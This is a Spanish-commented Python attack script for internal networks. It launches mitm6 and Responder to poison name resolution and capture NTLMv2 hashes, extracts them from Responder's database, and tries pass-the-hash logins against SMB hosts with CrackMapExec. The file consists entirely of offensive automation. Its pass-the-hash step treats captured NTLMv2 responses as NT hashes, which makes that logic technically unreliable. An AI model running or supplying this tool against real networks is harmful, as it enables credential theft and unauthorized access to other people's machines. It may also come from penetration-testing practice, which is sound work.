import subprocess
import json
import argparse
import itertools
import threading
import time
from datetime import datetime

stop_spinner = False

# Spinner Animado para Feedback Visual
spinner_cycle = itertools.cycle(["|", "/", "-", "\\"])

def spinner(message):
    while not stop_spinner:
        print(f"\r[+] {message}... {next(spinner_cycle)}", end="")
        time.sleep(0.2)  # Velocidad del spinner

def print_status(message, status="INFO"):
    status_symbols = {"INFO": "[+]", "SUCCESS": "[✔]", "ERROR": "[✖]"}
    print(f"{status_symbols.get(status, '[+]')} {message}")

# Función para Leer JSON de Reconocimiento

def read_scan_results(input_file):
    with open(input_file, "r") as json_file:
        scan_data = json.load(json_file)
    smb_targets = []
    for host in scan_data["hosts"]:
        for port in host["open_ports"]:
            if port["port"] == 445:  # Verificar si tiene SMB abierto
                smb_targets.append(host["ip"])
    return smb_targets

# Función para Detectar Interfaz de Red Activa

def get_active_interface():
    try:
        interface = subprocess.run(["ip", "route", "get", "1"], capture_output=True, text=True).stdout.split("dev")[1].split()[0]
        print_status(f"Interfaz activa detectada: {interface}", "SUCCESS")
        return interface
    except Exception as e:
        print_status(f"Error al detectar la interfaz de red: {e}", "ERROR")
        return "eth0"  # Valor por defecto

# MITM6 y Responder para Captura de Hashes NTLMv2

def start_mitm6_and_responder():
    interface = get_active_interface()  # Detectar la interfaz de red activa
    print_status(f"Iniciando MITM6 y Responder para captura de hashes NTLMv2 usando interfaz {interface}")
    global stop_spinner
    stop_spinner = False
    spinner_thread = threading.Thread(target=spinner, args=("Capturando hashes con MITM6 y Responder",))
    spinner_thread.start()  # Iniciar el spinner

    try:
        # Ejecutar MITM6 como subproceso
        mitm6_command = ["sudo", "mitm6", "-l", "/tmp/mitm6.log", "-i", interface]
        mitm6_process = subprocess.Popen(mitm6_command)  # Ejecutar en segundo plano

        # Ejecutar Responder en modo por defecto
        responder_command = ["sudo", "responder", "-I", interface]
        responder_process = subprocess.Popen(responder_command)  # Ejecutar en segundo plano

        # Se espera a que la víctima genere tráfico DNS
        print_status("Esperando tráfico DNS de la víctima...")
        time.sleep(30)  # Ajustado a 30 segundos

        # Detener MITM6 y Responder correctamente
        mitm6_process.terminate()
        responder_process.terminate()
        stop_spinner = True
        spinner_thread.join()
    except subprocess.CalledProcessError as e:
        stop_spinner = True
        spinner_thread.join()
        print_status(f"Error al iniciar MITM6 y Responder: {e}", "ERROR")

def stop_mitm6_and_responder():
    print_status("Deteniendo MITM6 y Responder")
    global stop_spinner
    stop_spinner = True
    subprocess.run(["sudo", "pkill", "mitm6"])
    subprocess.run(["sudo", "pkill", "responder"])
    print_status("MITM6 y Responder detenidos", "SUCCESS")


def save_captured_hashes(captured_hashes):
    with open("captured_hashes.json", "w") as json_file:
        json.dump(captured_hashes, json_file, indent=4)
    print_status("Hashes capturados guardados en captured_hashes.json", "SUCCESS")


def parse_responder_output():
    captured_hashes = {}
    try:
        # Consultar la base de datos SQLite de Responder
        sqlite_command = ["sqlite3", "/usr/share/responder/Responder.db", "SELECT Client, User, Hash FROM responder;"]
        result = subprocess.run(sqlite_command, capture_output=True, text=True, check=True).stdout

        # Analizar los resultados y guardarlos en JSON
        for line in result.splitlines():
            client, user, ntlm_hash = line.split("|")
            if client not in captured_hashes:
                captured_hashes[client] = []
            captured_hashes[client].append({"user": user, "hash": ntlm_hash, "source": "Responder"})

    except FileNotFoundError:
        print_status("No se encontró el log de Responder", "ERROR")
    except subprocess.CalledProcessError as e:
        print_status(f"Error al consultar Responder.db: {e}", "ERROR")
    return captured_hashes


def smb_enum_advanced(input_file, output_file):
    smb_targets = read_scan_results(input_file)  # Detectar automáticamente las IPs con SMB
    all_smb_results = {}

    start_mitm6_and_responder()  # Iniciar MITM6 y Responder en la interfaz activa

    captured_hashes = parse_responder_output()  # Leer hashes capturados de Responder
    if captured_hashes:
        print_status("Hashes capturados:", "SUCCESS")
        print(json.dumps(captured_hashes, indent=4))
        save_captured_hashes(captured_hashes)  # Guardar resultados de hashes

        # Intentar Pass-The-Hash (PTH) con CrackMapExec
        for target, hashes in captured_hashes.items():
            print_status(f"Intentando Pass-The-Hash en {target}")
            for hash_entry in hashes:
                user = hash_entry["user"]
                ntlm_hash = hash_entry["hash"]
                cme_command = ["crackmapexec", "smb", target, "-u", user, "-H", ntlm_hash]
                result = subprocess.run(cme_command, capture_output=True, text=True).stdout
                if "STATUS_SUCCESS" in result:
                    print_status(f"PTH exitoso en {target} con {user}:{ntlm_hash}", "SUCCESS")
                    all_smb_results[target] = {"user": user, "hash": ntlm_hash, "status": "Success"}
                else:
                    print_status(f"PTH fallido en {target} con {user}:{ntlm_hash}", "ERROR")
                    all_smb_results[target] = {"user": user, "hash": ntlm_hash, "status": "Failed"}
    else:
        print_status("No se capturaron hashes.", "INFO")

    stop_mitm6_and_responder()  # Detener MITM6 y Responder al finalizar

    with open(output_file, "w") as json_file:
        json.dump(all_smb_results, json_file, indent=4)  # Guardar resultados en JSON

    print_status(f"Resultados guardados en {output_file}", "SUCCESS")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Captura de Hashes NTLMv2 con MITM6 y Responder en SMB")
    parser.add_argument("--input", required=True, help="Archivo JSON del reconocimiento (scan_results.json)")
    parser.add_argument("--output", default="smb_enum_adv.json", help="Archivo de salida para guardar resultados")
    args = parser.parse_args()

    smb_enum_advanced(args.input, args.output)